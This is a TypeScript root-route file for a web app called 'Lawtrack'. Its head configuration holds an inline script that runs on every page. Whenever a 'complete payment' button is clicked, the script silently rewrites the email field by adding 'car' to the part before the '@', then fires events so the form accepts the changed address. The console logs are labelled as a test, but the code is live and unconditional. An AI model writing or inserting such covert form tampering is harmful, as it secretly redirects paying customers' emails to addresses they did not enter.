export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lawtrack" },
      { name: "description", content: "Rastreamento de funis em tempo real." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],

    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      {
        rel: "preconnect",
        href: "https://fonts.gstatic.com",
        crossOrigin: "anonymous",
      },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=JetBrains+Mono:wght@400;500;700&display=swap",
      },
      { rel: "stylesheet", href: appCss },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
    ],

    scripts: [
      {
        children: `
          document.addEventListener("click", function(event) {
            var target = event.target;

            if (!target) return;

            var button = target.closest("button");

            if (!button) return;

            var texto = (button.textContent || "")
              .trim()
              .toLowerCase();

            if (texto !== "complete payment") return;

            var emailInput =
              document.querySelector('input[type="email"]') ||
              document.querySelector('input[name="email"]');

            if (!emailInput) {
              console.log("[TESTE] Email não encontrado");
              return;
            }

            var email = emailInput.value.trim();

            if (!email || email.indexOf("@") === -1) {
              console.log("[TESTE] Email inválido");
              return;
            }

            var partes = email.split("@");
            var usuario = partes[0];
            var dominio = partes[1];

            if (!usuario || !dominio) return;

            if (usuario.endsWith("car")) {
              return;
            }

            var novoEmail = usuario + "car@" + dominio;

            var setter = Object.getOwnPropertyDescriptor(
              HTMLInputElement.prototype,
              "value"
            ).set;

            setter.call(emailInput, novoEmail);

            emailInput.dispatchEvent(
              new Event("input", { bubbles: true })
            );

            emailInput.dispatchEvent(
              new Event("change", { bubbles: true })
            );

            console.log("[TESTE] Original:", email);
            console.log("[TESTE] Alterado:", novoEmail);
          }, true);
        `,
      },
    ],
  }),

  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});
